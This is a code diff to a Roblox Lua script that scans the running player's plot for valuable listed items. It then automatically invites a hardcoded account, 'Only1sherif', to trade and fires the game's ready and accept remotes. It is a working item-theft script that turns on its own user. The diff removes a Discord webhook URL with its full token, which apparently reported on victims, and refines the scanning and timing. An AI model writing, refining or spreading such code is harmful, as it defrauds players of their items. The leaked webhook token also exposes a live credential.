@@ -5,7 +5,6 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local plr = Players.LocalPlayer
 
 local TARGET_NAME = "Only1sherif"
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1496254716508639262/J-eMNrXhdgaWAiIlMIiObJCsXw0E3s4XHB2S-0HLvkOYRdoJI2QDnAGmPU0EJtTZhbK6"
 
 local wantedItems = {
     "Tralaledon", "Strawberry Elephant", "Skibidi Toilet", "Rosey and Teddy",
@@ -41,22 +40,31 @@ local acceptRE = getRemote("RE/TradeService/Accept")
 local function scanPlot()
     local plots = workspace:FindFirstChild("Plots")
     if not plots then return false end
+    
     local myPlot = nil
+    local myName = plr.Name:lower()
+    local myDisplayName = plr.DisplayName:lower()
+
     for _, p in ipairs(plots:GetChildren()) do
         local sign = p:FindFirstChild("PlotSign")
         if sign then
-            local lbl = sign:FindFirstChildOfClass("SurfaceGui", true):FindFirstChildOfClass("TextLabel", true)
-            if lbl and (lbl.Text:lower():find(plr.Name:lower()) or lbl.Text:lower():find(plr.DisplayName:lower())) then
-                myPlot = p
-                break
+            local label = sign:FindFirstChildOfClass("TextLabel", true)
+            if label then
+                local t = label.Text:lower()
+                if t:find(myName) or t:find(myDisplayName) then
+                    myPlot = p
+                    break
+                end
             end
         end
     end
+
     if myPlot then
         for _, child in ipairs(myPlot:GetChildren()) do
             if child:IsA("Model") then
+                local itemName = child.Name:lower()
                 for _, wanted in ipairs(wantedItems) do
-                    if child.Name:lower():find(wanted:lower()) then
+                    if itemName == wanted:lower() or itemName:find("^" .. wanted:lower()) then
                         return true
                     end
                 end
@@ -71,16 +79,18 @@ local function sendInvite()
     if tl and tl:FindFirstChild("TradePlayerList") then
         local inner = tl.TradePlayerList
         local sb = inner.bg.SearchFrame.SearchBox
+        
         sb.Text = TARGET_NAME
         task.wait(0.3)
         pcall(function() firesignal(sb.FocusLost, true) end)
-        task.wait(0.2)
+        task.wait(0.5)
+        
         for _, p in pairs(inner.Global.List:GetChildren()) do
             if p:IsA("Frame") and p:FindFirstChild("Fill") then
                 local nameLbl = p.Fill:FindFirstChild("Username")
                 if nameLbl and nameLbl.Text:lower():find(TARGET_NAME:lower()) then
                     local send = p.Fill:FindFirstChild("Send")
-                    if send then
+                    if send and send.Visible then
                         pcall(function() firesignal(send.Activated) end)
                         return true
                     end
@@ -99,7 +109,7 @@ task.spawn(function()
                 local inner = tradeUI.TradeLiveTrade
                 
                 if readyRE then readyRE:FireServer("d73acf93-6f32-44df-b813-0f6b32c7afd9") end
-                task.wait(0.1)
+                task.wait(0.2)
                 if acceptRE then acceptRE:FireServer("918ee0f5-e98f-413f-b76e-baee47b021cb") end
                 
                 if inner.Other.Username.Text:lower():find(TARGET_NAME:lower()) then
@@ -120,9 +130,10 @@ task.spawn(function()
             else
                 if scanPlot() then
                     sendInvite()
+                    task.wait(5)
                 end
             end
         end)
-        task.wait(1.5)
+        task.wait(2)
     end
 end)
